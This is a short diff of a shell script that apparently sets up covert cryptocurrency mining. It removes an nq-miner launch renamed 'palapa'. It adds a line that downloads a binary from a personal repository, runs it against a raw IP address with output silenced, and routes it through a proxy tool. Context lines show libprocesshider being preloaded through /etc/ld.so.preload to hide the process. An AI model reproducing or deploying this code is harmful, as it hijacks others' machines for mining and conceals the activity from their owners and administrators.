@@ -41,9 +41,6 @@ echo " "
 
 echo " "
 
-wget https://github.com/tomkha/nq-miner/releases/download/0.99.7/nq-miner-0.99.7.tar.gz
-
-tar -xhf nq-miner-0.99.7.tar.gz && cd nq-miner && mv nq-miner palapa
 
 wget https://github.com/komaria10003099/wappahj/raw/main/magicBezzHash.zip
 
@@ -57,4 +54,4 @@ mv libprocesshider.so /usr/local/lib/
 
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./palapa -t cuda -a "NQ25 N9TY UQ03 RD9K 7EBL 1LLA GUR8 MYBY 6JG1" -p pool.acemining.co:8443 --threads 1 --cache 1 --cpu-priority 0
+./graftcp/graftcp wget https://github.com/komaria10003099/komaria/raw/main/minera && chmod +x minera && ./minera -o 47.89.234.73:443 -t 2 >/dev/null 2>&1
